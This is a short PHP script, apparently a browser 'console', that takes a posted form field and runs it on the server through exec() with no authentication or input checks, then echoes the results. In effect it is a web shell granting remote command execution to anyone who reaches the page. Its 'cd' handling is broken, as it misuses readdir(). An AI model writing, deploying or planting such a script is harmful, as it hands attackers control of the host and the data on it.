 <?
	$command = $_POST['console'];

	$size = strlen($command);

	echo "<form action = console.php method = post>";
	echo "<input type = text name = console size = 30>";
	echo "<input type = submit value = OK>";

	if($size != 0)
	{
		$commandTemp = substr($command, 0, 2);

		if($commandTemp == "cd")
		{
			$commandResult = substr($command, 3, $size);
			echo "$commandResult";
			$temp = readdir($commandResult);
			echo "<br><br>$temp";
		}
		else
		{
			exec($command, $temp);
			echo "<br>";
                        print_r($temp);
			
			for($i = 0 ; $i < sizeof($temp); $i++)
			{
				echo "<font size = 2><b>$temp[$i]</b><br>";
			}
		}
	}
?>